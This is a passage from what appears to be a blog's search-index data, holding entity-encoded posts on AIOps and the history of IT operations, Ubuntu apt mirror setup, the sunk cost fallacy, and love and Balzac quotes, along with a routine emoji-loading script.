&#x5982;&#xFF1A;&#x817E;&#x8BAF;&#x6E38;&#x620F;&#x7CFB;&#x7EDF;&#x7684;&#x84DD;&#x9CB8;&#x7CFB;&#x7EDF;&#xFF0C;&#x817E;&#x8BAF;&#x793E;&#x4EA4;&#x9886;&#x57DF;&#x7684;&#x7EC7;&#x4E91;&#x7CFB;&#x7EDF;&#xFF0C;&#x963F;&#x91CC;&#x7535;&#x5546;&#x9886;&#x57DF;&#x7684;&#x9E70;&#x773C;&#x7CFB;&#x7EDF;&#xFF0C;&#x6211;&#x53F8;&#x9488;&#x5BF9;&#x4E91;&#x4E1A;&#x52A1;CloudBU&#x7684;CloudScope&#x7B49;&#x7B49;&#xFF1B;&#x968F;&#x7740;&#x793E;&#x4F1A;&#x5728;&#x7EBF;&#x5316;&#x7684;&#x7A0B;&#x5EA6;&#x4E0D;&#x65AD;&#x63D0;&#x5347;&#xFF0C;&#x5404;&#x5927;&#x4F01;&#x4E1A;&#x4E5F;&#x5F00;&#x59CB;&#x610F;&#x8BC6;&#x5230;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#x5BF9;&#x4E8E;&#x4F01;&#x4E1A;&#x7684;&#x6548;&#x7387;&#x3001;&#x7A33;&#x5B9A;&#x548C;&#x6210;&#x672C;&#x6709;&#x7740;&#x51B3;&#x5B9A;&#x6027;&#x4F5C;&#x7528;&#xFF0C;&#x5BF9;&#x8FD0;&#x7EF4;&#x7684;&#x8BC9;&#x6C42;&#x548C;&#x8981;&#x6C42;&#x4E5F;&#x8D8A;&#x6765;&#x8D8A;&#x9AD8;&#x3002;&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x771F;&#x6B63;&#x5730;&#x88AB;&#x91CD;&#x89C6;&#xFF0C;&#x540C;&#x65F6;&#x8FD0;&#x7EF4;&#x884C;&#x4E1A;&#x6709;&#x81EA;&#x5DF1;&#x5782;&#x76F4;&#x7684;&#x6280;&#x672F;&#x5927;&#x4F1A;&#x5982;GOPS&#x5927;&#x4F1A;&#xFF0C;&#x540C;&#x65F6;QCon &#x4EE5;&#x53CA; ArchSummit &#x8FD9;&#x6837;&#x7684;&#x9876;&#x7EA7;&#x6280;&#x672F;&#x5CF0;&#x4F1A;&#xFF0C;&#x5F00;&#x59CB;&#x4E13;&#x95E8;&#x8BBE;&#x7F6E;&#x8FD0;&#x7EF4;&#x4E13;&#x9898;&#x3002; &#x7531;&#x6280;&#x672F;&#x4F53;&#x7CFB;&#x53D1;&#x5C55;&#xFF0C;&#x8FD0;&#x7EF4;&#x6240;&#x9762;&#x4E34;&#x7684;&#x573A;&#x666F;&#x590D;&#x6742;&#x5EA6;&#x4E5F;&#x6025;&#x5267;&#x4E0A;&#x5347;&#xFF0C;&#x539F;&#x6709;&#x7684;&#x8FD0;&#x7EF4;&#x6280;&#x80FD;&#x5982;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EF4;&#x62A4;&#x3001;&#x7CFB;&#x7EDF;&#x914D;&#x7F6E;&#x3001;&#x811A;&#x672C;&#x7F16;&#x5199;&#x5DF2;&#x7ECF;&#x5B8C;&#x5168;&#x6EE1;&#x8DB3;&#x4E0D;&#x4E86;&#x8981;&#x6C42;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x8F6F;&#x4EF6;&#x7CFB;&#x7EDF;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x63D0;&#x5347;&#xFF0C;&#x4E5F;&#x9700;&#x8981;&#x8FD0;&#x7EF4;&#x6295;&#x5165;&#x66F4;&#x591A;&#x7684;&#x7CBE;&#x529B;&#x53BB;&#x5173;&#x6CE8;&#x4E1A;&#x52A1;&#x8F6F;&#x4EF6;&#x67B6;&#x6784;&#x548C;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x4E0A;&#x3002;&#x6240;&#x4EE5;&#x5C31;&#x6D6E;&#x73B0;&#x51FA;&#x6211;&#x4EEC;&#x6240;&#x719F;&#x77E5;&#x7684; DevOps&#xFF0C;SRE&#x3001;PE&#x3001;&#x5E94;&#x7528;&#x8FD0;&#x7EF4;&#x3001;&#x6280;&#x672F;&#x8FD0;&#x8425;&#x8FD9;&#x4E9B;&#x65B0;&#x7684;&#x540D;&#x5B57;&#x3001;&#x5C97;&#x4F4D;&#x6216;&#x7406;&#x5FF5;&#x3002; &#x7B2C;&#x4E94;&#x4E2A;&#x9636;&#x6BB5;&#xFF1A;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#x9636;&#x6BB5;&#x6216;AIOps&#xFF0C;&#x968F;&#x7740;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x7B97;&#x6CD5;&#x7A81;&#x7834;&#x3001;&#x8BA1;&#x7B97;&#x80FD;&#x529B;&#x63D0;&#x5347;&#x5982; GPU&#x3001;&#x6D77;&#x91CF;&#x6570;&#x636E;&#x5E26;&#x6765;&#x4E86;AI&#x9769;&#x547D;&#xFF0C;&#x800C;AIOps &#x5C06;&#x4EBA;&#x5DE5;&#x667A;&#x80FD;&#x5E94;&#x7528;&#x4E8E;&#x8FD0;&#x7EF4;&#x9886;&#x57DF;&#xFF0C;&#x57FA;&#x4E8E;&#x5DF2;&#x6709;&#x7684;&#x8FD0;&#x7EF4;&#x6570;&#x636E; (&#x65E5;&#x5FD7;&#x3001;&#x76D1;&#x63A7;&#x4FE1;&#x606F;&#x3001;&#x5E94;&#x7528;&#x4FE1;&#x606F;&#x7B49;)&#xFF0C;&#x901A;&#x8FC7;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8FDB;&#x4E00;&#x6B65;&#x89E3;&#x51B3;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x6240;&#x4E0D;&#x80FD;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x63D0;&#x9AD8;&#x7CFB;&#x7EDF;&#x7684;&#x9884;&#x5224;&#x80FD;&#x529B;&#x3001;&#x7A33;&#x5B9A;&#x6027;&#x3001;&#x964D;&#x4F4E;IT&#x6210;&#x672C;&#xFF0C;&#x5E76;&#x63D0;&#x9AD8;&#x4F01;&#x4E1A;&#x7684;&#x4EA7;&#x54C1;&#x7ADE;&#x4E89;&#x529B;&#x3002;&#x4E0D;&#x8FC7;&#x5F53;&#x524D;&#x4EC5;&#x6709;&#x56FD;&#x5185;&#x5916;&#x7684;&#x5927;&#x5382;&#xFF0C;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x7B97;&#x6CD5;&#x89E3;&#x51B3;&#x5355;&#x70B9;&#x7684;&#x8FD0;&#x7EF4;&#x95EE;&#x9898;&#xFF0C;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#x4E4B;&#x8DEF;&#x4EC5;&#x5904;&#x4E8E;&#x521D;&#x7EA7;&#x9636;&#x6BB5;&#xFF0C;AIOps &#x7684;&#x53D1;&#x5C55;&#x4E00;&#x5B9A;&#x662F;&#x4E00;&#x4E2A;&#x957F;&#x671F;&#x6F14;&#x8FDB;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x540C;&#x65F6;AI &#x662F; Ops &#x7684;&#x6709;&#x529B;&#x8865;&#x5145;&#xFF0C;&#x8FDB;&#x4E00;&#x6B65;&#x964D;&#x4F4E;&#x8FD0;&#x7EF4;&#x7684;&#x5DE5;&#x4F5C;&#x5F3A;&#x5EA6;&#x548C;&#x538B;&#x529B;&#xFF0C;&#x4F46;&#x662F; AIOps &#x4E00;&#x5B9A;&#x5EFA;&#x8BBE;&#x5728;&#x9AD8;&#x5EA6;&#x81EA;&#x52A8;&#x5316;&#x548C;&#x5B8C;&#x5584;&#x7684;&#x8FD0;&#x7EF4;&#x4F53;&#x7CFB;&#x4E4B;&#x4E0A;&#x7684;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x6F14;&#x8FDB;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x4E0D;&#x4F1A;&#x662F;&#x4E00;&#x4E2A;&#x8DF3;&#x8DC3;&#x6027;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x4E5F;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x5B8C;&#x5168;&#x98A0;&#x8986;&#x6027;&#x7684; AIOps &#x6A21;&#x5F0F;&#xFF0C;&#x5C06;&#x73B0;&#x6709;&#x7684; Ops &#x4F53;&#x7CFB;&#x66FF;&#x4EE3;&#x6389;&#x3002; &#x6BEB;&#x65E0;&#x7591;&#x95EE;&#xFF0C;&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#x7684;&#x53D1;&#x5C55;&#x5DF2;&#x7ECF;&#x8FDB;&#x5165;&#x4E86;&#x6DF1;&#x6C34;&#x671F;&#x3002;&#x968F;&#x7740;Docker&#x3001;OpenStack&#x3001;Puppet&#x7B49;&#x6280;&#x672F;&#x7684;&#x6D41;&#x884C;&#xFF0C;&#x4EE5;&#x53CA;CI/CD&#x3001;DevOps&#x7B49;&#x7406;&#x5FF5;&#x7684;&#x843D;&#x5730;&#x751F;&#x6839;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x7684;&#x53D1;&#x5C55;&#x8FCE;&#x6765;&#x4E86;&#x5C0F;&#x9AD8;&#x6F6E;&#x3002;&#x6574;&#x4F53;&#x6765;&#x770B;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0;&#x5E2E;&#x52A9;&#x63D0;&#x5347;&#x4E86;&#x8FD0;&#x7EF4;&#x7684;&#x6548;&#x7387;&#xFF0C;&#x5E76;&#x51CF;&#x5C11;&#x4E86;&#x56E0;&#x4EBA;&#x5DE5;&#x548C;&#x6D41;&#x7A0B;&#x64CD;&#x4F5C;&#x800C;&#x5F15;&#x8D77;&#x7684;&#x8FD0;&#x7EF4;&#x6545;&#x969C;&#x3002; &#x8BB0;&#x5F97;&#x5728;2001&#x5E74;&#x7684;&#x65F6;&#x5019;&#xFF0C;Gartner Group&#x6709;&#x4E00;&#x4E2A;&#x8C03;&#x67E5;&#x663E;&#x793A;&#x5728;IT&#x9879;&#x76EE;&#x7ECF;&#x5E38;&#x51FA;&#x73B0;&#x7684;&#x95EE;&#x9898;&#x4E2D;&#xFF0C;&#x6E90;&#x81EA;&#x6280;&#x672F;&#x6216;&#x4EA7;&#x54C1;&#xFF08;&#x5305;&#x62EC;&#x786C;&#x4EF6;&#x3001;&#x8F6F;&#x4EF6;&#x3001;&#x7F51;&#x7EDC;&#x3001;&#x7535;&#x529B;&#x5931;&#x5E38;&#x53CA;&#x5929;&#x707E;&#x7B49;&#xFF09;&#x7684;&#x95EE;&#x9898;&#x53EA;&#x5360;20%&#xFF0C;&#x4F46;&#x6D41;&#x7A0B;&#x5931;&#x8BEF;&#x65B9;&#x9762;&#x5374;&#x5360;40%&#xFF0C;&#x4EBA;&#x5458;&#x758F;&#x5931;&#x65B9;&#x9762;&#x4E5F;&#x5360;&#x5230;&#x4E86;40%&#x3002;&#x8FD9;&#x4E9B;&#x5E74;&#x6765;&#xFF0C;&#x4F01;&#x4E1A;&#x901A;&#x8FC7;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0;&#x4EE5;&#x53CA;DevOps&#x7B49;&#x534F;&#x4F5C;&#x7406;&#x5FF5;&#x9010;&#x6B65;&#x89E3;&#x51B3;&#x4E86;Gartner&#x63D0;&#x5230;&#x7684;&#x6D41;&#x7A0B;&#x5931;&#x8BEF;&#x548C;&#x4EBA;&#x5458;&#x758F;&#x5FFD;&#x76F8;&#x5173;&#x7684;80%&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x867D;&#x7136;&#x76EE;&#x524D;&#x6CA1;&#x6709;&#x5177;&#x4F53;&#x7684;&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#xFF0C;&#x4F46;&#x53EF;&#x4EE5;&#x786E;&#x8BA4;&#x7684;&#x662F;&#xFF0C;&#x8FD9;&#x4E00;&#x95EE;&#x9898;&#x5F97;&#x5230;&#x4E86;&#x6709;&#x6548;&#x89E3;&#x51B3;&#x3002; &#x4F46;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x70B9;&#x662F;&#x5F53;&#x524D;&#x7684;IT&#x9879;&#x76EE;&#x57FA;&#x7840;&#x8BBE;&#x65BD;&#x73AF;&#x5883;&#x4E0E;5&#x5E74;&#x524D;&#x5DF2;&#x7ECF;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x540C;&#x65E5;&#x800C;&#x8BED;&#xFF0C;&#x66F4;&#x4E0D;&#x7528;&#x8BF4;10&#x5E74;&#x524D;&#x3002;&#x8FD1;&#x51E0;&#x5E74;&#xFF0C;&#x968F;&#x7740;&#x4E91;&#x8BA1;&#x7B97;&#x3001;&#x5FAE;&#x670D;&#x52A1;&#x7B49;&#x6280;&#x672F;&#x7684;&#x6D41;&#x884C;&#xFF0C;&#x4EE5;&#x53CA;&#x4E92;&#x8054;&#x7F51;&#x4E1A;&#x52A1;&#x7684;&#x8FC5;&#x901F;&#x53D1;&#x5C55;&#xFF0C;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x8981;&#x5173;&#x6CE8;&#x7684;&#x670D;&#x52A1;&#x6570;&#x91CF;&#x4E5F;&#x5448;&#x73B0;&#x4E86;&#x6307;&#x6570;&#x7EA7;&#x589E;&#x957F;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x867D;&#x7136;&#x63D0;&#x5347;&#x4E86;&#x6548;&#x7387;&#xFF0C;&#x89E3;&#x51B3;&#x4E86;&#x4E00;&#x90E8;&#x5206;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x4E5F;&#x9047;&#x5230;&#x4E86;&#x65B0;&#x7684;&#x96BE;&#x9898;&#xFF0C;&#x6BD4;&#x5982;&#x9762;&#x5BF9;&#x7E41;&#x591A;&#x7684;&#x62A5;&#x8B66;&#x4FE1;&#x606F;&#xFF0C;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x5E94;&#x8BE5;&#x5982;&#x4F55;&#x5904;&#x7406;&#xFF1F;&#x6545;&#x969C;&#x53D1;&#x751F;&#x65F6;&#xFF0C;&#x53C8;&#x5982;&#x4F55;&#x80FD;&#x591F;&#x8FC5;&#x901F;&#x5B9A;&#x4F4D;&#x95EE;&#x9898;&#xFF1F; &#x5F53;&#x4F01;&#x4E1A;&#x9047;&#x5230;&#x8FD9;&#x4E9B;&#x65B0;&#x7684;&#x95EE;&#x9898;&#x5374;&#x65E0;&#x4ECE;&#x4E0B;&#x624B;&#x65F6;&#xFF0C;&#x6070;&#x597D;&#x5386;&#x53F2;&#x8FDB;&#x5165;&#x4E86;&#x4EBA;&#x5DE5;&#x667A;&#x80FD;&#x65F6;&#x4EE3;&#xFF0C;&#x90A3;&#x4E0A;&#x9762;&#x7684;&#x8FD9;&#x4E9B;&#x95EE;&#x9898;&#x53EF;&#x5426;&#x901A;&#x8FC7;&#x300E;AI + Ops&#x300F;&#x7684;&#x8FD9;&#x79CD;&#x8DE8;&#x754C;&#x521B;&#x65B0;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x89E3;&#x51B3;&#x5462;&#xFF1F;&#x4E8E;&#x662F;Gartner&#x5728;2016&#x5E74;&#x65F6;&#x4FBF;&#x63D0;&#x51FA;&#x4E86;AIOps&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x5E76;&#x9884;&#x6D4B;&#x5230;2020&#x5E74;&#xFF0C;AIOps&#x7684;&#x91C7;&#x7528;&#x7387;&#x5C06;&#x4F1A;&#x8FBE;&#x5230;50%&#x3002;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;AIOps&#x5C31;&#x662F;&#x5E0C;&#x671B;&#x57FA;&#x4E8E;&#x5DF2;&#x6709;&#x7684;&#x8FD0;&#x7EF4;&#x6570;&#x636E;&#xFF08;&#x65E5;&#x5FD7;&#x3001;&#x76D1;&#x63A7;&#x4FE1;&#x606F;&#x3001;&#x5E94;&#x7528;&#x4FE1;&#x606F;&#x7B49;&#xFF09;&#x5E76;&#x901A;&#x8FC7;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8FDB;&#x4E00;&#x6B65;&#x89E3;&#x51B3;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x6CA1;&#x529E;&#x6CD5;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#x3002; &#x5C31;&#x76EE;&#x524D;&#x6765;&#x770B;&#xFF0C;&#x56FD;&#x5185;&#x7684;&#x767E;&#x5EA6;&#x3001;&#x641C;&#x72D7;&#x3001;&#x5B9C;&#x4FE1;&#x3001;&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x90FD;&#x5DF2;&#x7ECF;&#x63A2;&#x7D22;&#x5C1D;&#x8BD5;&#x4E86;AIOps&#xFF0C;&#x5E76;&#x4E14;&#x53D6;&#x5F97;&#x4E86;&#x4E0D;&#x9519;&#x7684;&#x6536;&#x76CA;&#x3002;&#x5728;2017&#x5E74;InfoQ&#x4E3E;&#x529E;&#x7684;CNUTCon&#x5168;&#x7403;&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#x5927;&#x4F1A;&#x4E0A;&#xFF0C;&#x4E5F;&#x6709;&#x4E0D;&#x5C11;AIOps&#x76F8;&#x5173;&#x7684;&#x8BAE;&#x9898;&#xFF0C;&#x751A;&#x81F3;&#x4F1A;&#x8BAE;&#x4E3B;&#x9898;&#x4E5F;&#x4ECE;&#x53BB;&#x5E74;&#x7684;&#x5BB9;&#x5668;&#x751F;&#x6001;&#x8FED;&#x4EE3;&#x5230;&#x4ECA;&#x5E74;&#x7684;&#x667A;&#x80FD;&#x65F6;&#x4EE3;&#x7684;&#x65B0;&#x8FD0;&#x7EF4;&#xFF0C;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x8BFB;&#x8005;&#x53EF;&#x4EE5;&#x5173;&#x6CE8;&#x3002; &#x672A;&#x6765;&#x8BBE;&#x60F3;&#xFF1A;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#x7684;&#x7EC8;&#x6781;&#x76EE;&#x6807; &#x65E0;&#x4EBA;&#x503C;&#x5B88;&#xFF0C;&#x7CFB;&#x7EDF;&#x5177;&#x5907;&#x6545;&#x969C;&#x81EA;&#x6108;&#x3001;&#x65E0;&#x4EBA;&#x503C;&#x5B88;&#x53D8;&#x66F4;&#x3001;&#x81EA;&#x52A8;&#x6269;&#x7F29;&#x5BB9;&#x3001;&#x81EA;&#x52A8;&#x9632;&#x5FA1;&#x7B49;&#x80FD;&#x529B;&#xFF1B;&#x5982;&#x7535;&#x5F71;&#x300A;&#x592A;&#x7A7A;&#x65C5;&#x5BA2;&#x300B;&#x4E00;&#x8258;&#x8FD0;&#x9001;&#x6570;&#x5343;&#x51AC;&#x7720;&#x4EBA;&#x5230;&#x9065;&#x8FDC;&#x6B96;&#x6C11;&#x5730;&#x661F;&#x7403;&#x7684;&#x592A;&#x7A7A;&#x98DE;&#x8239;&#xFF0C;&#x4EC5;&#x4E00;&#x4E9B;&#x673A;&#x5668;&#x4EBA;&#x8D1F;&#x8D23;&#x98DE;&#x8239;&#x7684;&#x65E5;&#x5E38;&#x7EF4;&#x62A4;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"十二句经典的爱情名言","date":"2020-08-26T12:42:05.000Z","path":"/posts/4c41c7ef/","text":"Who, being loved, is poor? &#x2014;&#x2014;Oscar Wilde Each time you happen to me all over again. &#x2014;&#x2014;Edith Wharton Grow old along with me! The best is yet to be. &#x2014;&#x2014;Robert Browning Whatever our souls are made of, his and mine are the same. &#x2014;&#x2014;Emily Bronte I love her, and that&#x2019;s the beginning and end of everything. &#x2014;&#x2014;F.Scott Shakespeare My heart, the bird of the wilderness, has found its sky in you eyes. &#x2014;&#x2014;Tagore You should be kissed and often, and by someone who knows how. &#x2014;&#x2014;&#x201C;Gone With the Wind&#x201D; He was my North, my South, my East and West, My working week and my Sunday rest. &#x2014;&#x2014;W.H.Auden In vain I have struggled. It will not do. My feelings will not be repressed. You must allow me to tell you how ardently I admire and love you. &#x2014;&#x2014;Jane Austen Every atom of your flesh is as dear to me as my own: in pain and sickness it would still be dear. &#x2014;&#x2014;Charlotte Bronts document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"英语","slug":"英语","permalink":"https://marnm.github.io/tags/英语/"}]},{"title":"Ubuntu修改配置及美化","date":"2020-08-22T10:38:41.000Z","path":"/posts/129acd64/","text":"&#x8FD9;&#x91CC;&#x8BF4;&#x4E00;&#x4E9B;&#x5728;Ubuntu18.04&#x4E0B;&#x7684;&#x57FA;&#x672C;&#x914D;&#x7F6E;&#x53CA;&#x7F8E;&#x5316; &#x5B89;&#x88C5;&#x5B8C;&#x7CFB;&#x7EDF;&#x540E;&#x76F4;&#x63A5;&#x4FEE;&#x6539;&#x955C;&#x50CF;&#x6E90;&#xFF0C;&#x6539;&#x6210;&#x56FD;&#x5185;&#x7684;&#xFF1A; &#x5907;&#x4EFD; 1sudo mv /etc/apt/source.list /etc/apt/source.list.backup &#x963F;&#x91CC;&#x4E91;&#x7684;Ubuntu18.04&#x6E90;&#xFF1A; 1234567891011121314deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse &#x6E05;&#x534E;&#x7684;18.04&#x955C;&#x50CF;&#x6E90;&#xFF1A; 12345678910111213# &#x9ED8;&#x8BA4;&#x6CE8;&#x91CA;&#x4E86;&#x6E90;&#x7801;&#x955C;&#x50CF;&#x4EE5;&#x63D0;&#x9AD8; apt update &#x901F;&#x5EA6;&#xFF0C;&#x5982;&#x6709;&#x9700;&#x8981;&#x53EF;&#x81EA;&#x884C;&#x53D6;&#x6D88;&#x6CE8;&#x91CA;deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse# &#x9884;&#x53D1;&#x5E03;&#x8F6F;&#x4EF6;&#x6E90;&#xFF0C;&#x4E0D;&#x5EFA;&#x8BAE;&#x542F;&#x7528;# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"Linux","slug":"Linux","permalink":"https://marnm.github.io/tags/Linux/"}]},{"title":"你要懂得及时止损，别太在乎沉没成本","date":"2020-08-21T14:57:52.000Z","path":"/posts/bb750036/","text":"How to Tell That It&#x2019;s Time to Quit &#x5982;&#x4F55;&#x8FA8;&#x8BA4;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x8BE5;&#x653E;&#x5F03; Quitting is usually perceived to be negative, whereas perseverance is seen as admirable and even essential for success in life. Surprisingly, though, when perseverance is taken too far, it becomes self-destructive. Research shows that people who let go of unattainable goals experience higher well-being. So why is it so hard to surrender? Here is the one thing to consider in order to celebrate &#x201C;failure&#x201D;: We may be biased against quitting because we are trapped in the &#x201C;sunk cost fallacy.(&#x6C89;&#x6CA1;&#x6210;&#x672C;&#x8BEF;&#x8C2C;)&#x201D; In economics, sunk costs are those past cost that has already been paid and cannot be recovered. They represent the time and effort already spent on a project. Let&#x2019;s say you buy tickets to a concert. On the day of the event, you catch a cold. Even though you are sick, you decide to go to the concert because otherwise &#x201C;you would have wasted your money&#x201D;. Boom! You just fell for the &#x201C;sunk cost fallacy.&#x201D; Sure, you spent the money already. But you can&#x2019;t get it back. If you aren&#x2019;t going to have a good time at the concert, you only make your life worse by going. Everyone experiences the influence of sunk costs in some form or another, whether through the investment of time or money in projects or doomed relationships. It is hard to let go. And while we know it&#x2019;s common, the sunk cost fallacy may also be more dangerous than we realize. Holding on to a current subpar opportunity hinders the potential for one&#x2019;s future. To help you let go of sunk-cost thinking, economics recommend instead considering opportunity cost. Whereas a sunk cost is about the past, opportunity cost is about the future. In a world of finite resources, every dollar you spend on one thing is not spent elsewhere. Held back by yesterday&#x2019;s projects, you cannot solve future problems. Letting go, then, and ending the continued investment of time, money, or energy in one direction offers us practical and mental freedom to advance in another, more promising area. Those who quit dead-end endeavors are mentally healthier than those who stay entrapped, as people trapped by dead-end goals may begin to experience negative effects like anxiety and diminished well-being. When we are overly focused on a particular goal or outcome, we become rigid and inflexible. This narrows our options and makes us feel more limited. Use your time and resources more effectively: Do not be afraid to give up frustrating goals. New opportunities will be just around the corner. document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"英语","slug":"英语","permalink":"https://marnm.github.io/tags/英语/"}]},{"title":"诺尔·巴尔扎克（Honoréde Balzac）的名言","date":"2020-08-19T14:32:17.000Z","path":"/posts/51acad32/","text":"Honor&#xE9;de de Balzac was a novelist and playwright in nineteenth-century France. Among his most successful works were La Duchesse de La Duchesse de Langeais, Eugenie Grandet, and Pere Goriot, La Comedie Humaine. The greatest legacy Honor&#xE9;de Balzac left behind was the use of realism in the novel. The structure of his novels, in which the plot is presented in sequential order by an omniscient narrator and one event causes another, was influential for many later writers. Literary scholars have also focused on his exploration of the links between social standing and character development, as well as a belief in the strength of the human spirit that has endured to this day. In commemoration of the 170th anniversary of the death of Honor&#xE9;de de Balzac, we some quotes from his works. Love is the poetry of the senses. &#x7231;&#x662F;&#x611F;&#x5B98;&#x7684;&#x8BD7;&#x6B4C; Vanity is only to be satisfied by gold in floods. &#x865A;&#x8363;&#x5FC3;&#x7531;&#x6CDB;&#x6EE5;&#x7684;&#x91D1;&#x94B1;&#x6765;&#x586B;&#x8865; Excess of joy is harder to bear than any amount of sorrow.&#x8FC7;&#x5EA6;&#x7684;&#x6B22;&#x4E50;&#x6BD4;&#x4EFB;&#x4F55;&#x7A0B;&#x5EA6;&#x7684;&#x60B2;&#x4F24;&#x90FD;&#x96BE;&#x53D7; The most natural feelings are those we are least willing to confess.&#x6700;&#x81EA;&#x7136;&#x7684;&#x611F;&#x89C9;&#x662F;&#x6211;&#x4EEC;&#x6700;&#x4E0D;&#x613F;&#x627F;&#x8BA4;&#x7684;&#x611F;&#x89C9; All poetry, like every work of art, proceeds from a swift vision of things. The heart of a mother is a deep abyss at the bottom of which you will always find forgiveness. People exaggerate both happiness and unhappiness; we are never so fortunate nor so unfortunate as people say we are. Such is life. It is no cleaner than a kitchen; it reeks like a kitchen; and if you mean to cook your dinner, you must expect to soil your hands; the real art is in getting them clean again, and therein lies the whole morality of our epoch. document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); 